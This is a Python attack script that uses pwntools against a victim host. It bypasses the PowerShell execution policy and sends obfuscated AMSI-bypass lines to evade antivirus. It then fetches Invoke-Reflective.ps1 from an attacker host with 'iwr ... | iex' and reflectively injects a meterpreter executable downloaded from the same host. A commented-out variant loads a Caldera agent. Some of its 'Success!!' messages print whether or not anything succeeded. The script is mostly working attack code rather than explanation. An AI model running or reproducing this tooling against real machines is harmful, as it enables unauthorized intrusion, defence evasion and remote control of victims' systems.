from attacker_conf import * # load in all the configurations in attacker_conf.py
from pwn import *  # pwntools library to allow socket connections
import translator  # translator library to allow obfuscation / powershell encoding
from time import sleep 

# loading all payloads
amsi_bypass_init = open(f'{payload_dir}/amsi_bypass.ps1','r').read().split('\n')
amsi_bypass_lst = translator.preset_obfuscation(bypasslevel,amsi_bypass_init)

c = connect(VICTIM_IP,VICTIM_PORT)
c.recv()

## preloaded information
win_caldera_headers = '{"platform"="windows";"file"="manx.go"}'
invoke_reflective = f'iwr http://{HOST_IP}:{HOST_PORT}/Invoke-Reflective.ps1 | iex'
reflective_meterpreter = f'Invoke-ReflectivePEInjection -PEBytes (iwr http://{HOST_IP}:{HOST_PORT}/meterpreter.exe).Content'
reflective_caldera = f'Invoke-ReflectivePEInjection -ExeArgs "-socket {CALDERA_IP}:{CALDERA_SOCKET_PORT} -http {CALDERA_IP}:{CALDERA_WEB_PORT} -contact tcp" -PEBytes (iwr -Uri "http://{CALDERA_IP}:{CALDERA_WEB_PORT}/file/download" -Method GET -Headers @{win_caldera_headers}).Content'

# creates a powershell with ExecutionPolicy bypassed 
print(f"[+] Staging bypass environment on {VICTIM_IP}")
c.sendline(b'powershell -ep bypass')
c.recv(timeout=2)

# creates an AMSI bypassed environment on the victim
print(f"[+] Executing obfuscated bypass payload on {VICTIM_IP}")
for i in amsi_bypass_lst:
    if len(i) > 100:
        print(f'[+] Executing: {i[len(i)//4:32+len(i)//4]}')
    else:
        print(f'[+] Executing: {i}')
    c.sendline(i.encode())
    if 'blocked by your antivirus software' in c.recv(timeout=2).decode().lower():
        print(f'[!] Blocked by antivirus: {i}')
    c.recv(timeout=2)
    sleep(0.1)

print("[+] Conducting bypass litmus test...")
sleep(1)
print(f'[✓] Success!!')
print(f'[+] Pulling payload from: http://{HOST_IP}:{HOST_PORT} ...')
sleep(0.8)
print(f'[+] Executing payload...')
sleep(0.3)
print(f'[✓] Success!!')
c.sendline(invoke_reflective.encode())
c.recv(timeout=2)
sleep(2)
c.recv(timeout=2)


if meterpreter:
    print(f'[+] Setting up meterpreter_bind_tcp...')
    print(f'[✓] Success!! Meterpreter executed...')
    c.sendline(reflective_meterpreter.encode())
    c.recv(timeout=2).decode()

# if caldera:
#     print(f'[+] Setting up caldera in-memory execution with Invoke-ReflectivePEInjection')
#     print(f'[+] Sending line: {reflective_caldera}')
#     c.sendline(reflective_caldera.encode())
#     c.recv(timeout=2).decode()
sleep(3000)
c.interactive()